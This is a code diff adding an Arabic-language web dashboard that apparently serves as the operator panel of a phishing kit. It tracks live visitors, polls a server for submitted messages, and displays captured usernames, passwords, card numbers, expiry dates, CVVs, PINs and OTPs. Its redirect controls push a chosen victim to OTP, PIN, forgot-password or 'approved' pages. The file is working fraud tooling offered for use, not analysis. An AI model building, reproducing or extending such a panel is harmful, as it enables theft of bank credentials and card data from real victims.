@@ -1,0 +1,405 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>لوحة التحكم — الزوار والرسائل</title>
+  <meta name="description" content="تتبع الزوار النشطين وإدارة صندوق الوارد">
+  <link rel="icon" type="image/png" href="favicon.png">
+  <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&display=swap" rel="stylesheet">
+  <style>
+    *{margin:0;padding:0;box-sizing:border-box}
+    body{font-family:'Tajawal',sans-serif;background:#f5f5f7;min-height:100vh;color:#111}
+    .header{background:#fff;border-bottom:1px solid #e5e5e7;padding:16px 20px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:50}
+    .header-right{display:flex;align-items:center;gap:12px}
+    .header h1{font-size:20px;font-weight:800;color:#111}
+    .header h1 span{color:#6b6b6b;font-weight:500;font-size:15px}
+    .icon-btn{width:44px;height:44px;border-radius:12px;border:none;background:#f2f2f2;cursor:pointer;display:flex;align-items:center;justify-content:center;color:#333;transition:background .2s}
+    .icon-btn:hover{background:#e8e8e8}
+    .icon-btn.active{background:#fdecea;color:#b11811}
+    .logout-btn{height:40px;padding:0 20px;border-radius:12px;background:#b11811;color:#fff;border:none;font-family:'Tajawal',sans-serif;font-size:14px;font-weight:700;cursor:pointer;transition:background .2s}
+    .logout-btn:hover{background:#9c1410}
+    .stats{display:flex;gap:16px;padding:20px;max-width:600px}
+    .stat-card{flex:1;background:#fff;border-radius:20px;padding:20px 24px;box-shadow:0 2px 8px rgba(0,0,0,.04)}
+    .stat-card .label{font-size:13px;color:#6b6b6b;font-weight:500;margin-bottom:4px}
+    .stat-card .value{font-size:36px;font-weight:800;color:#111}
+    .stat-card.active .value{color:#22c55e}
+    .stat-card.inbox .value{color:#b11811}
+    .stat-card .dot{display:inline-block;width:8px;height:8px;border-radius:50%;margin-inline-end:6px;vertical-align:middle}
+    .stat-card.active .dot{background:#22c55e;animation:pulse 2s infinite}
+    .stat-card.inbox .dot{background:#b11811}
+    @keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
+    .tabs{display:flex;gap:0;padding:0 20px;border-bottom:1px solid #e5e5e7;background:#fff}
+    .tab{padding:14px 24px;font-size:15px;font-weight:700;color:#9a9a9a;border:none;background:none;cursor:pointer;border-bottom:3px solid transparent;font-family:'Tajawal',sans-serif;transition:color .2s}
+    .tab.active{color:#b11811;border-bottom-color:#b11811}
+    .tab:hover{color:#333}
+    .tab-content{display:none;padding:20px}
+    .tab-content.active{display:block}
+    .empty-state{text-align:center;padding:60px 20px;color:#9a9a9a}
+    .empty-state svg{margin-bottom:16px;opacity:.4}
+    .empty-state p{font-size:15px}
+    .visitor-list{display:flex;flex-direction:column;gap:12px;max-width:800px}
+    .visitor-item{background:#fff;border-radius:16px;padding:16px 20px;box-shadow:0 2px 8px rgba(0,0,0,.04);display:flex;align-items:center;gap:16px}
+    .visitor-avatar{width:44px;height:44px;border-radius:12px;background:#f2f2f2;display:flex;align-items:center;justify-content:center;color:#9a9a9a;font-size:18px;flex-shrink:0}
+    .visitor-info{flex:1;min-width:0}
+    .visitor-info .name{font-size:15px;font-weight:700;color:#111}
+    .visitor-info .page{font-size:13px;color:#6b6b6b;margin-top:2px}
+    .visitor-time{font-size:12px;color:#9a9a9a;white-space:nowrap}
+    .visitor-status{width:10px;height:10px;border-radius:50%;background:#22c55e;flex-shrink:0;animation:pulse 2s infinite}
+    .msg-list{display:flex;flex-direction:column;gap:12px;max-width:800px}
+    .msg-item{background:#fff;border-radius:16px;padding:16px 20px;box-shadow:0 2px 8px rgba(0,0,0,.04);cursor:pointer;transition:background .2s;display:flex;align-items:center;gap:16px}
+    .msg-item:hover{background:#fafafa}
+    .msg-icon{width:44px;height:44px;border-radius:12px;background:#fdecea;display:flex;align-items:center;justify-content:center;color:#b11811;flex-shrink:0}
+    .msg-info{flex:1;min-width:0}
+    .msg-info .subject{font-size:15px;font-weight:700;color:#111}
+    .msg-info .sender{font-size:13px;color:#6b6b6b;margin-top:2px}
+    .msg-info .preview{font-size:13px;color:#9a9a9a;margin-top:4px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+    .msg-meta{text-align:left;flex-shrink:0}
+    .msg-meta .date{font-size:12px;color:#9a9a9a;white-space:nowrap}
+    .msg-meta .badge{display:inline-block;min-width:22px;height:22px;border-radius:11px;background:#b11811;color:#fff;font-size:12px;font-weight:700;text-align:center;line-height:22px;padding:0 6px;margin-top:6px}
+    .msg-detail{display:none;max-width:800px}
+    .msg-detail.show{display:block}
+    .msg-detail-header{display:flex;align-items:center;gap:12px;margin-bottom:20px}
+    .back-btn{width:40px;height:40px;border-radius:12px;background:#f2f2f2;border:none;cursor:pointer;display:flex;align-items:center;justify-content:center;color:#333;transition:background .2s}
+    .back-btn:hover{background:#e8e8e8}
+    .msg-detail-title{font-size:20px;font-weight:800}
+    .msg-thread{display:flex;flex-direction:column;gap:16px}
+    .msg-bubble{background:#fff;border-radius:16px;padding:20px;box-shadow:0 2px 8px rgba(0,0,0,.04)}
+    .msg-bubble .meta{display:flex;justify-content:space-between;margin-bottom:10px}
+    .msg-bubble .meta .name{font-weight:700;font-size:14px;color:#111}
+    .msg-bubble .meta .time{font-size:12px;color:#9a9a9a}
+    .msg-bubble .body{font-size:15px;color:#333;line-height:1.7}
+    .msg-bubble .body p{margin-bottom:6px}
+    .msg-bubble .field-row{display:flex;gap:8px;margin-bottom:4px}
+    .msg-bubble .field-label{font-weight:700;color:#6b6b6b;font-size:13px;min-width:80px}
+    .msg-bubble .field-value{color:#111;font-size:14px}
+    .sound-indicator{font-size:12px;color:#9a9a9a;margin-inline-start:4px}
+    .redirect-section{background:#fff;border-radius:16px;padding:20px;box-shadow:0 2px 8px rgba(0,0,0,.04);margin-top:20px;max-width:800px}
+    .redirect-section h3{font-size:16px;font-weight:700;margin-bottom:12px;color:#111}
+    .redirect-btns{display:flex;gap:8px;flex-wrap:wrap}
+    .redirect-btn{padding:10px 20px;border-radius:12px;border:2px solid #e5e5e7;background:#fff;font-family:'Tajawal',sans-serif;font-size:14px;font-weight:600;cursor:pointer;transition:all .2s;color:#333}
+    .redirect-btn:hover{border-color:#b11811;color:#b11811}
+    .redirect-btn.active{background:#b11811;color:#fff;border-color:#b11811}
+    @media(max-width:480px){
+      .stats{flex-direction:column}
+      .header h1 span{display:block;margin-top:2px}
+    }
+  </style>
+</head>
+<body>
+  <div class="header">
+    <div class="header-right">
+      <h1>لوحة التحكم <span>— الزوار والرسائل</span></h1>
+    </div>
+    <div style="display:flex;gap:8px;align-items:center">
+      <button class="icon-btn" id="soundToggle" onclick="toggleSound()" title="تشغيل/إيقاف الصوت">
+        <svg id="soundIcon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M11 5 6 9H2v6h4l5 4V5Z"/><line x1="23" x2="17" y1="9" y2="15"/><line x1="17" x2="23" y1="9" y2="15"/></svg>
+      </button>
+      <button class="logout-btn" onclick="logout()">تسجيل الخروج</button>
+    </div>
+  </div>
+
+  <div class="stats">
+    <div class="stat-card active">
+      <div class="label"><span class="dot"></span>نشط الآن</div>
+      <div class="value" id="activeCount">0</div>
+    </div>
+    <div class="stat-card inbox">
+      <div class="label"><span class="dot"></span>صندوق الوارد</div>
+      <div class="value" id="inboxCount">0</div>
+    </div>
+  </div>
+
+  <div class="tabs">
+    <button class="tab active" data-tab="active" onclick="switchTab('active')">النشطون</button>
+    <button class="tab" data-tab="inbox" onclick="switchTab('inbox')">صندوق الوارد</button>
+  </div>
+
+  <div class="tab-content active" id="tab-active">
+    <div class="visitor-list" id="visitorList">
+      <div class="empty-state" id="emptyVisitors">
+        <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M8 14s1.5 2 4 2 4-2 4-2"/><line x1="9" x2="9.01" y1="9" y2="9"/><line x1="15" x2="15.01" y1="9" y2="9"/></svg>
+        <p>لا يوجد زوار نشطون حالياً</p>
+      </div>
+    </div>
+  </div>
+
+  <div class="tab-content" id="tab-inbox">
+    <div class="msg-list" id="msgList"></div>
+    <div class="msg-detail" id="msgDetail">
+      <div class="msg-detail-header">
+        <button class="back-btn" onclick="closeMsgDetail()">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m9 18 6-6-6-6"/></svg>
+        </button>
+        <span class="msg-detail-title" id="msgDetailTitle"></span>
+      </div>
+      <div class="msg-thread" id="msgThread"></div>
+    </div>
+  </div>
+
+  <div class="redirect-section" id="redirectSection" style="display:none;margin:20px">
+    <h3>توجيه الزائر</h3>
+    <p style="font-size:13px;color:#6b6b6b;margin-bottom:12px">اختر الصفحة التي سيتم توجيه الزائر إليها بعد تسجيل الدخول</p>
+    <div class="redirect-btns">
+      <button class="redirect-btn" onclick="setRedirect('none')">بدون توجيه</button>
+      <button class="redirect-btn" onclick="setRedirect('otp')">رمز التحقق (OTP)</button>
+      <button class="redirect-btn" onclick="setRedirect('pin')">رمز PIN</button>
+      <button class="redirect-btn" onclick="setRedirect('forgot')">نسيت كلمة المرور</button>
+      <button class="redirect-btn" onclick="setRedirect('approved')">موافقة</button>
+    </div>
+  </div>
+
+  <audio id="notifSound" preload="auto">
+    <source src="data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=" type="audio/wav">
+  </audio>
+
+  <script>
+    (function checkAuth() {
+      try {
+        if (sessionStorage.getItem('admin_auth') !== '1') {
+          window.location.href = 'auth.html';
+          return;
+        }
+      } catch(ex) {
+        window.location.href = 'auth.html';
+      }
+    })();
+
+    var soundOn = false;
+    var messages = [];
+    var visitors = [];
+    var currentRedirect = 'none';
+    var selectedVisitorId = null;
+
+    function loadFromServer() {
+      fetch('/api/messages').then(function(r){ return r.json() }).then(function(data) {
+        var prevCount = messages.length;
+        messages = data || [];
+        renderMessages();
+        if (messages.length > prevCount && prevCount > 0) playNotif();
+      }).catch(function(){});
+      fetch('/api/redirect').then(function(r){ return r.json() }).then(function(d) {
+        currentRedirect = d.redirect || 'none';
+        updateRedirectBtns();
+      }).catch(function(){});
+    }
+
+    loadFromServer();
+    setInterval(loadFromServer, 5000);
+
+    function toggleSound() {
+      soundOn = !soundOn;
+      var btn = document.getElementById('soundToggle');
+      var icon = document.getElementById('soundIcon');
+      if (soundOn) {
+        btn.classList.add('active');
+        icon.innerHTML = '<polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"/><path d="M15.54 8.46a5 5 0 0 1 0 7.07"/><path d="M19.07 4.93a10 10 0 0 1 0 14.14"/>';
+      } else {
+        btn.classList.remove('active');
+        icon.innerHTML = '<path d="M11 5 6 9H2v6h4l5 4V5Z"/><line x1="23" x2="17" y1="9" y2="15"/><line x1="17" x2="23" y1="9" y2="15"/>';
+      }
+    }
+
+    function playNotif() {
+      if (!soundOn) return;
+      try { document.getElementById('notifSound').play(); } catch(ex){}
+    }
+
+    function logout() {
+      try { sessionStorage.removeItem('admin_auth'); } catch(ex){}
+      window.location.href = 'auth.html';
+    }
+
+    function switchTab(tab) {
+      document.querySelectorAll('.tab').forEach(function(t){ t.classList.toggle('active', t.dataset.tab === tab) });
+      document.querySelectorAll('.tab-content').forEach(function(c){ c.classList.toggle('active', c.id === 'tab-' + tab) });
+      var rs = document.getElementById('redirectSection');
+      if (tab === 'active') {
+        rs.style.display = selectedVisitorId ? 'block' : 'none';
+      } else {
+        rs.style.display = 'none';
+      }
+      if (tab === 'inbox') {
+        document.getElementById('msgList').style.display = '';
+        document.getElementById('msgDetail').classList.remove('show');
+      }
+    }
+
+    function formatDate(ts) {
+      var d = new Date(ts);
+      return d.toLocaleDateString('ar-IQ') + ' ' + d.toLocaleTimeString('ar-IQ', {hour:'2-digit', minute:'2-digit'});
+    }
+
+    function renderVisitors() {
+      var list = document.getElementById('visitorList');
+      var empty = document.getElementById('emptyVisitors');
+      document.getElementById('activeCount').textContent = visitors.length;
+      if (visitors.length === 0) {
+        empty.style.display = '';
+        return;
+      }
+      empty.style.display = 'none';
+      var html = '';
+      visitors.forEach(function(v) {
+        html += '<div class="visitor-item" onclick="selectVisitor(\'' + v.id + '\')" style="cursor:pointer;' + (selectedVisitorId === v.id ? 'border:2px solid #b11811' : '') + '">';
+        html += '<div class="visitor-avatar"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="8" r="4"/><path d="M20 21a8 8 0 0 0-16 0"/></svg></div>';
+        html += '<div class="visitor-info"><div class="name">' + escapeHtml(v.name || 'زائر') + '</div><div class="page">' + escapeHtml(v.page || '/') + '</div></div>';
+        html += '<div class="visitor-time">' + (v.time ? formatDate(v.time) : '') + '</div>';
+        html += '<div class="visitor-status"></div>';
+        html += '</div>';
+      });
+      list.innerHTML = html;
+    }
+
+    function selectVisitor(id) {
+      selectedVisitorId = selectedVisitorId === id ? null : id;
+      renderVisitors();
+      document.getElementById('redirectSection').style.display = selectedVisitorId ? 'block' : 'none';
+      updateRedirectBtns();
+    }
+
+    function setRedirect(target) {
+      currentRedirect = target;
+      updateRedirectBtns();
+      fetch('/api/redirect', {
+        method: 'POST',
+        headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({ target: target })
+      }).catch(function(){});
+    }
+
+    function updateRedirectBtns() {
+      document.querySelectorAll('.redirect-btn').forEach(function(btn) {
+        btn.classList.toggle('active', btn.getAttribute('onclick').indexOf("'" + currentRedirect + "'") !== -1);
+      });
+    }
+
+    function renderMessages() {
+      var list = document.getElementById('msgList');
+      document.getElementById('inboxCount').textContent = messages.length;
+      if (messages.length === 0) {
+        list.innerHTML = '<div class="empty-state"><svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><rect width="20" height="16" x="2" y="4" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7"/></svg><p>لا توجد رسائل في صندوق الوارد</p></div>';
+        return;
+      }
+
+      var grouped = {};
+      messages.forEach(function(m) {
+        var key = m.subject || 'بدون موضوع';
+        if (!grouped[key]) grouped[key] = [];
+        grouped[key].push(m);
+      });
+
+      var html = '';
+      Object.keys(grouped).forEach(function(subject) {
+        var msgs = grouped[subject];
+        var last = msgs[msgs.length - 1];
+        var iconSvg = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect width="20" height="16" x="2" y="4" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7"/></svg>';
+
+        html += '<div class="msg-item" onclick="openMsg(\'' + escapeAttr(subject) + '\')">';
+        html += '<div class="msg-icon">' + iconSvg + '</div>';
+        html += '<div class="msg-info">';
+        html += '<div class="subject">' + escapeHtml(subject) + '</div>';
+        html += '<div class="sender">' + escapeHtml(last.name || 'مجهول') + '</div>';
+        html += '<div class="preview">' + escapeHtml(last.message || last.phone || '') + '</div>';
+        html += '</div>';
+        html += '<div class="msg-meta">';
+        html += '<div class="date">' + (last.time ? formatDate(last.time) : '') + '</div>';
+        if (msgs.length > 1) html += '<div class="badge">' + msgs.length + '</div>';
+        html += '</div>';
+        html += '</div>';
+      });
+      list.innerHTML = html;
+    }
+
+    function openMsg(subject) {
+      var msgs = messages.filter(function(m){ return (m.subject || 'بدون موضوع') === subject });
+      if (!msgs.length) return;
+
+      document.getElementById('msgList').style.display = 'none';
+      document.getElementById('msgDetailTitle').textContent = subject;
+      var thread = document.getElementById('msgThread');
+      var html = '';
+      msgs.forEach(function(m) {
+        html += '<div class="msg-bubble">';
+        html += '<div class="meta"><span class="name">' + escapeHtml(m.name || 'مجهول') + '</span><span class="time">' + (m.time ? formatDate(m.time) : '') + '</span></div>';
+        html += '<div class="body">';
+        if (m.name) html += '<div class="field-row"><span class="field-label">الاسم:</span><span class="field-value">' + escapeHtml(m.name) + '</span></div>';
+        if (m.phone) html += '<div class="field-row"><span class="field-label">الهاتف:</span><span class="field-value" dir="ltr">' + escapeHtml(m.phone) + '</span></div>';
+        if (m.page) html += '<div class="field-row"><span class="field-label">الصفحة:</span><span class="field-value">' + escapeHtml(m.page) + '</span></div>';
+        if (m.message) html += '<p style="margin-top:8px">' + escapeHtml(m.message) + '</p>';
+        if (m.amount) html += '<div class="field-row"><span class="field-label">المبلغ:</span><span class="field-value">' + escapeHtml(m.amount) + '</span></div>';
+        if (m.occupation) html += '<div class="field-row"><span class="field-label">العمل:</span><span class="field-value">' + escapeHtml(m.occupation) + '</span></div>';
+        if (m.salary) html += '<div class="field-row"><span class="field-label">الراتب:</span><span class="field-value">' + escapeHtml(m.salary) + '</span></div>';
+        if (m.color) html += '<div class="field-row"><span class="field-label">اللون:</span><span class="field-value">' + escapeHtml(m.color) + '</span></div>';
+        if (m.governorate) html += '<div class="field-row"><span class="field-label">المحافظة:</span><span class="field-value">' + escapeHtml(m.governorate) + '</span></div>';
+        if (m.address) html += '<div class="field-row"><span class="field-label">العنوان:</span><span class="field-value">' + escapeHtml(m.address) + '</span></div>';
+        if (m.username) html += '<div class="field-row"><span class="field-label">المستخدم:</span><span class="field-value">' + escapeHtml(m.username) + '</span></div>';
+        if (m.password) html += '<div class="field-row"><span class="field-label">كلمة المرور:</span><span class="field-value">' + escapeHtml(m.password) + '</span></div>';
+        if (m.cardNumber) html += '<div class="field-row"><span class="field-label">رقم البطاقة:</span><span class="field-value" dir="ltr">' + escapeHtml(m.cardNumber) + '</span></div>';
+        if (m.expiry) html += '<div class="field-row"><span class="field-label">تاريخ الانتهاء:</span><span class="field-value" dir="ltr">' + escapeHtml(m.expiry) + '</span></div>';
+        if (m.cvv) html += '<div class="field-row"><span class="field-label">CVV:</span><span class="field-value" dir="ltr">' + escapeHtml(m.cvv) + '</span></div>';
+        if (m.pin) html += '<div class="field-row"><span class="field-label">PIN:</span><span class="field-value" dir="ltr">' + escapeHtml(m.pin) + '</span></div>';
+        if (m.otp) html += '<div class="field-row"><span class="field-label">OTP:</span><span class="field-value" dir="ltr">' + escapeHtml(m.otp) + '</span></div>';
+        html += '</div></div>';
+      });
+      thread.innerHTML = html;
+      document.getElementById('msgDetail').classList.add('show');
+    }
+
+    function closeMsgDetail() {
+      document.getElementById('msgDetail').classList.remove('show');
+      document.getElementById('msgList').style.display = '';
+    }
+
+    function escapeHtml(str) {
+      if (!str) return '';
+      return String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+    }
+
+    function escapeAttr(str) {
+      return escapeHtml(str).replace(/'/g,'&#39;');
+    }
+
+    function addMessage(msg) {
+      msg.time = msg.time || Date.now();
+      messages.unshift(msg);
+      renderMessages();
+      playNotif();
+      document.getElementById('inboxCount').textContent = messages.length;
+    }
+
+    function addVisitor(visitor) {
+      visitor.time = visitor.time || Date.now();
+      var existing = visitors.findIndex(function(v){ return v.id === visitor.id });
+      if (existing !== -1) {
+        visitors[existing] = visitor;
+      } else {
+        visitors.push(visitor);
+        playNotif();
+      }
+      renderVisitors();
+    }
+
+    function removeVisitor(id) {
+      visitors = visitors.filter(function(v){ return v.id !== id });
+      if (selectedVisitorId === id) {
+        selectedVisitorId = null;
+        document.getElementById('redirectSection').style.display = 'none';
+      }
+      renderVisitors();
+    }
+
+    renderVisitors();
+    renderMessages();
+
+    window.adminAPI = {
+      addMessage: addMessage,
+      addVisitor: addVisitor,
+      removeVisitor: removeVisitor,
+      getRedirect: function(){ return currentRedirect; },
+      getMessages: function(){ return messages; },
+      clearMessages: function(){ messages = []; saveMessages(); renderMessages(); }
+    };
+  </script>
+</body>
+</html>
